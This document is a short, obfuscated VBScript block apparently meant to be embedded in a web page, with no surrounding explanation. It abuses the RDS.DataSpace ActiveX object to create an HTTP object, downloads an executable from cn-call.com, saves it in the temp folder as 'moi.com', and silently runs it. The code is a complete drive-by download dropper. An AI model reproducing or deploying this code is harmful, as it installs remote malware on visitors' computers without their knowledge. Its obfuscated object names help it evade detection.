<script language="VBScript">
    on error resume next
    Set dfile = document.createElement("ob"&fgfg454ddd&"ject")
    dfile.setAttribute "cla"&Q52fg&"ssid", "clsid:B"&fg725fg&"D96C556-"&fQ6ff&"65A3-11"&fg12525&"D0-983A-"&fgfg454&"00C04F"&fgfg454&"C29E36"
    Set http = dfile.CreateObject("Micro"&fgfg454&"soft.X"&F4sdTRhh&"MLH"&"TTP","")
    set strm = dfile.createobject("Ad"&fgfg454&"od"&sdf33&"b."&F4sdTRhh&"Str"&"eam","")
    strm.type = 1
    http.Open "GET", "http://www.cn-call.com/gmsex.exe", False
    http.Send
    set fso = dfile.createobject("Scri"&fdsfsdf&"pting.Fil"&"eSyst"&"emObject","")
    set temp = fso.GetSpecialFolder(2) 
    filename= fso.BuildPath(temp,"moi.com")
    strm.open
    strm.write http.responseBody
    strm.savetofile filename,2
    strm.close
    set exc = dfile.createobject("She"&fgfg454&"ll."&F4sdTRhh&"Applic"&gfgfdf&"ation","")
    str4="open"
    exc.ShellExecute filename,"","",str4,0
 </script>